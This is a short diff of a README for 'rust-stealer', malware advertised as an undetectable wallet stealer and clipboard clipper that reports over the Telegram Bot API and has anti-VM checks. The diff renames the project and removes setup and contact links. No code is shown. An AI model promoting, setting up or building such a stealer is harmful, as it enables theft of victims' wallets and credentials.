@@ -1,7 +1,4 @@
-## rust-stealer / Luca Stealer
-
-## How to setup?
-https://github.com/luca364/rust-stealer/wiki/Installation
+## rust-stealer / FUD Stealer/Clipper with Telegram Bot API 
 
 # Functions:
 ### Wallet Stealer
@@ -157,14 +154,8 @@ https://github.com/luca364/rust-stealer/wiki/Installation
 - Simple Anti VM
 
 
-## Write Up's about the stealer
-https://github.com/luca364/rust-stealer/wiki/Write-Up's
+If you need help setting it up, I apologize for now that I do not have time but will make a full wiki soon.
 
-
-## I need help setting it up
-
-Please try it yourself first, If you cant do it.
-Write me https://t.me/Lxca1337
 
 
 
